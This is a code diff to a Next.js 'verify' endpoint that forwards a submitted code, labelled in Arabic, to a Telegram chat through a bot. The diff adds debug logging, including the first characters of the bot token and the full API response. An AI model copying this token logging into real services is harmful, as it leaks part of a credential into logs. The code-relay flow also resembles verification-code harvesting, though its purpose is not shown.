@@ -10,13 +10,17 @@ export async function POST(req: NextRequest) {
     `📟 الكود: ${code}`,
   ].join("\n");
 
+  const chatId = (process.env.TELEGRAM_CHAT_IDS ?? "").split(",")[0].trim();
+  const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  console.log("[verify] chatId:", chatId, "botToken:", botToken ? botToken.slice(0, 10) + "..." : "MISSING");
+
   const res = await fetch(
-    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+    `https://api.telegram.org/bot${botToken}/sendMessage`,
     {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: (process.env.TELEGRAM_CHAT_IDS ?? "").split(",")[0].trim(),
+        chat_id: chatId,
         text,
         reply_markup: {
           inline_keyboard: [
@@ -27,10 +31,11 @@ export async function POST(req: NextRequest) {
     }
   );
 
+  const resBody = await res.json().catch(() => ({}));
+  console.log("[verify] telegram response:", res.status, JSON.stringify(resBody));
+
   if (!res.ok) {
-    const error = await res.json().catch(() => ({}));
-    console.error("Telegram sendMessage failed:", res.status, error);
-    return NextResponse.json({ ok: false, error }, { status: 502 });
+    return NextResponse.json({ ok: false, error: resBody }, { status: 502 });
   }
 
   return NextResponse.json({ ok: true });
